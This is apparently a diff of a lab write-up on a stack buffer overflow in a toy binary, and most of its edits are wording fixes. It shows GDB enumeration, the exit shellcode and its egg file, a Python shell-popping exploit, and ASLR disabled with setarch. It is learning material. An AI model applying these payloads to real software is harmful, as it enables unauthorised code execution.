@@ -196,9 +196,9 @@ Which is just 7 bytes long.
 
 ## Methodology
 
-The exit shellcode is 7 bytes long small enough to fit inside the buffer's size.
-The memory address location of the `buffer` can be used as the return address where the shellcode will be stored.
-The next stack after buffer is the base pointer (EBP), after the base pointer is the return address of the `vuln` function that will be modified to point to the memory address of the `buffer`.
+The exit shellcode is 7 bytes long, small enough to fit inside the buffer, which has a size of 8 bytes.
+The memory address location of the `buffer` will be used as the return address, as it is where the shellcode will be stored.
+The next stack after `buffer` is the base pointer (EBP), and after the base pointer is the return address of the `vuln` function, which will be modified to point to the memory address of the `buffer`.
 
 With this, an exploit can be crafted to terminate the program with the desired exit status code of `1`.
 
@@ -226,7 +226,7 @@ But set the assembly language syntax first to Intel
 ### Enumeration
 
 Since the binary is not stripped, the function symbols can be printed.
-Disassemble the `main` and `vuln` symbols in assembly language.
+Disassemble the `main` and `vuln` symbols in assembly language using the `disassemble` command.
 
 ```
 (gdb) disassemble main
@@ -261,7 +261,7 @@ However, breakpoints cannot be added yet since the memory of the program is not 
 
 And exit (CTRL+C).
 
-Disassemble the symbols again for `vuln`
+Disassemble the symbols again for `vuln`:
 
 ```
 (gdb) disassemble vuln
@@ -280,16 +280,16 @@ End of assembler dump.
 ```
 
 The proper memory addresses can now be seen.
-Add a breakpoint to the first instruction `push ebp`
+Add a breakpoint to the first instruction `push ebp`:
 
 ```
 (gdb) break *0x5655617d
 Breakpoint 1 at 0x5655617d: file vuln.c, line 3.
 ```
 
-A `*` is needed since the address is a pointer.
+An `*` is needed since the address is a pointer.
 
-Define hooks for the breakpoint
+Define hooks for the breakpoint:
 
 ```
 (gdb) define hook-stop
@@ -301,9 +301,9 @@ End with a line saying just "end".
 ```
 
 These commands will automatically execute once a breakpoint is hit.
-What it does is print the instruction pointer of the current function and print out the 16 bytes of the stack pointer.
+What it does is print out the instruction pointer of the current function and print out the 16 bytes of the stack pointer.
 
-Rerun the program
+Rerun the program:
 
 ```
 (gdb) run
@@ -324,8 +324,8 @@ There are still no inputs provided here but the memory address of the `buffer` c
 $1 = (char (*)[8]) 0xffffcd18
 ```
 
-The memory address of `buffer` is stored at `0xffffcd18` and this is where the standard input are stored.
-To check, add another breakpoint on the `ret` instruction and continue the execution
+The memory address of `buffer` is stored at `0xffffcd18` and this is where the standard input is stored.
+To check, add another breakpoint on the `ret` instruction and continue the execution:
 
 ```
 (gdb) break *0x56556191
@@ -344,7 +344,7 @@ Breakpoint 2, 0x56556191 in vuln () at vuln.c:6
 ```
 
 The input for this was `AAAABBBBCCCCDDDDAAAABBBBCCCCDDDD` as can be seen, the bytes got replaced up until `0xffffcd37`.
-The contents of the `buffer` can be checked by
+The contents of the `buffer` and the succeeding pointers can be checked by using the command `x/16wx`:
 
 ```
 (gdb) x/16wx &buffer
@@ -357,7 +357,6 @@ The contents of the `buffer` can be checked by
 The first 8 bytes (`0x41414141	0x42424242`) are the buffer's contents.
 The next 4 bytes (`0x43434343`) is the base pointer.
 The next 4 bytes (`0x44444444`) is the return address which will be modified to point to the address of the `buffer` (at `0xffffcd18`).
-This is where the shellcode will be stored.
 
 ### Exploitation
 
@@ -369,7 +368,7 @@ Notice that the structure of the memory address is as follows:
           buffer                ebp           esp
 ```
 
-The payload `\x31\xc0\x40\x89\xc3\xcd\x80` can be stored on the `buffer`'s memory space
+The payload `\x31\xc0\x40\x89\xc3\xcd\x80` can be stored on the `buffer`'s memory space:
 
 ```
 [ 0x8940c031 0x--80cdc3 ] [ 0x-------- ] [ 0x-------- ] ...
@@ -397,7 +396,7 @@ Next is to add the memory address of the `buffer`.
 ```
 
 Thus, the final shellcode is `\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff`.
-We can store the shellcode to our `egg`
+We can store the shellcode to our `egg`:
 
 ```sh
 $ echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff" > egg
@@ -405,7 +404,7 @@ $ echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff" > 
 
 ## Documentation of Proofs
 
-To execute the exploit, run
+To execute the exploit, run:
 
 ```
 (gdb) run < egg
@@ -417,7 +416,7 @@ or
 (gdb) run <<< $(echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff")
 ```
 
-Which should successfully terminate the program with desired exit status
+Which should successfully terminate the program with desired exit status:
 
 ```
 [Inferior 1 (process 1075597) exited with code 01]
@@ -427,8 +426,7 @@ Which should successfully terminate the program with desired exit status
 
 ## Conclusion
 
-Stack smashing is an archaic method of binary exploitation that modern computers have protections against it.
-Thanks to Address Space Layout Randomization (ASLR) that modern operating systems are equipped with, it would be very difficult to execute this exploit.
+Stack smashing is an archaic method of binary exploitation and past computers are vulnerable against this type of exploitation. However, thanks to the  Address Space Layout Randomization (ASLR) that modern operating systems are equipped with, it would be very difficult to execute this exploit in the current times.
 Nonetheless, this is a fun exercise and we have learned a lot from it.
 
 Solution files can be found here:
@@ -442,17 +440,19 @@ Solution files can be found here:
 
 ## Acknowledgement and References
 
-- [LiveOverflow](https://www.youtube.com/@LiveOverflow) for usage of GDB
-- [Phrack Volume 7 Issue 49: Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html) for teaching us on smashing the stack
-- [Practical Binary Analysis](https://practicalbinaryanalysis.com/) for teaching assembly and basics of ELF
-- [Shell-Storm](https://shell-storm.org/shellcode/index.html) for providing shellcodes
+- [LiveOverflow](https://www.youtube.com/@LiveOverflow) for usage of GDB.
+- [Phrack Volume 7 Issue 49: Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html) for teaching us on smashing the stack.
+- [Practical Binary Analysis](https://practicalbinaryanalysis.com/) for teaching assembly and basics of ELF.
+- [Shell-Storm](https://shell-storm.org/shellcode/index.html) for providing shellcodes.
 
 ## Extra
 
 ### Return Me Shell!
 
 Writing a shellcode for exit status is quite boring.
+
 Why don't we pop a shell instead?
+
 Since it's annoying to use `echo` to generate our shellcode, we will be using our handy scripting language... Python!
 
 To pop a shell, we need a shellcode for it.
@@ -478,6 +478,7 @@ print(exploit)
 ```
 
 And that's it!
+
 Except this would not work because of how Python's `print()` function works.
 To prove this, we will compare echo's output against Python's output
 
@@ -509,12 +510,10 @@ b0200afddf57b3321ec88b73cddd7d7118fbac8cb8f9c8f781d3b1a0053367cd  eggshell
 2fb5cad2ba0574d4ac536518b463de6ed4846e8f4dfa635910b71d7c1cdcc757  eggshell2
 ```
 
-As you can see, the raw bytes of Python's print output is a mess.
-The hash value are not the same.
+As you can see, the raw bytes of Python's print output is a mess and the hash values are not the same.
 Hence, Python's print function should not be used
-This can be fixed by using a standard library output.
-
-The updated code is now
+But, this can be fixed by using a standard library output.
+The updated code is now:
 
 ```python
 import sys
@@ -528,7 +527,7 @@ exploit     = OFFSET * 12 + EIP + NOP*4 + SHELLCODE
 sys.stdout.buffer.write(exploit)
 ```
 
-Checking it once again
+Checking it once again:
 
 ```sh
 $ python exploit2.py > eggshell2 && xxd eggshell2
@@ -545,32 +544,33 @@ b0200afddf57b3321ec88b73cddd7d7118fbac8cb8f9c8f781d3b1a0053367cd  eggshell2
 
 Both shellcodes are now equal.
 
-Python can now be used to exploit the vulnerable binary
+Python can now be used to exploit the vulnerable binary:
 
 ```sh
 $ python exploit.py | ./vuln
 ```
 
 This is done by piping Python's output to the input of the program.
-However, this would not work and would cause an illegal instruction error
+However, this would not work and would cause an illegal instruction error:
 
 ```sh
 [1]    1090485 done                              python exploit2.py |
        1090486 segmentation fault (core dumped)  ./vuln
 ```
 
-Because of ASLR randomizing the memory allocations everytime the program is ran.
-To disable ASLR without disabling the system's protection, one can do this
+This is because of ASLR randomizing the memory allocations everytime the program is run.
+To disable ASLR without disabling the system's protection, one can do this:
 
 ```sh
 $ python exploit.py | setarch $(uname -m) -R ./vuln
 ```
 
-This execution may or may not work as the memory addresses in GDB compared to being ran directly are different.
+This execution may or may not work as the memory addresses in GDB compared to being run directly are different.
 This can be fixed by figuring out the exact memory address.
 There are many ways to do it but the simplest one that we have already done is through GDB and attaching GDB to the process of the program.
 The process of debugging with an attached process is similar.
-First run the vulnerable program with `setarch` and open up another terminal with GDB by attaching to the vulnerable process
+
+First run the vulnerable program with `setarch` and open up another terminal with GDB by attaching to the vulnerable process:
 
 ```sh
 $ setarch $(uname -m) -R ./vuln
@@ -579,13 +579,13 @@ $ gdb -p <process id>
 
 To find the process id, use `ps aux`.
 
-And if this does not work, we can use `gcore` to dump the current memory of a process id and manually find our input
+And if this does not work, we can use `gcore` to dump the current memory of a process id and manually find our input:
 
 ```sh
 $ gcore <process id>
 ```
 
-Run the program again and find its process id
+Run the program again and find its process id:
 
 ```sh
 $ setarch $(uname -m) -R ./vuln
@@ -595,7 +595,7 @@ birb     1450296 71.4  0.0   2732  1096 pts/9    R+   10:32   5:17 ./vuln
 ```
 
 Here, the process id is `1450296`.
-We then dump the memory of the process after our input back in the program (I used `ABCD`)
+We then dump the memory of the process after our input back in the program (I used `ABCD`):
 
 ```sh
 $ gcore 1450296
@@ -608,14 +608,14 @@ Saved corefile core.1450296
 ```
 
 This will create a core file dump in binary format.
-Read the coredump in hex using any hex editor tools available, we'll use good old `xxd` and pipe it to `vim`
+Read the coredump in hex using any hex editor tools available, we'll use good old `xxd` and pipe it to `vim`:
 
 ```sh
 $ xxd -g 4 core.1450296 | vim
 ```
 
 Then find the input (which is `ABCD`).
-There will be two results, find the memory addresses that contains the most likely data
+There will be two results, find the memory addresses that contains the most likely data:
 
 ```
 ...
@@ -625,7 +625,7 @@ There will be two results, find the memory addresses that contains the most like
 ...
 ```
 
-vs
+vs:
 
 ```
 ...
@@ -638,7 +638,7 @@ vs
 The second result is more likely to contain the EBP and ESP.
 We will use `0xffffcd48` (which is taken from `0xffffcd38` by adding 16 bytes) as the new return address
 
-Replace the EIP in the script with the correct return address, we can now rerun the exploit
+Replace the EIP in the script with the correct return address, we can now rerun the exploit:
 
 ```python
 $ python exploit.py | setarch $(uname -m) -R ./vuln
@@ -650,5 +650,5 @@ And voila!
 We got a shell!
 
 To conclude, there is not much difference in doing this method compared to GDB aside from automating the exploitation.
-The difficulty of running the program outside GDB lies on the ASLR (if enabled) and computers having allocating memory differently.
-Aside from that, for the shellcode there is no need to include the NOPs.
+The difficulty of running the program outside GDB lies on the ASLR (if enabled) and computers allocating memory differently.
+Aside from that, for the shellcode, there is no need to include the NOPs.
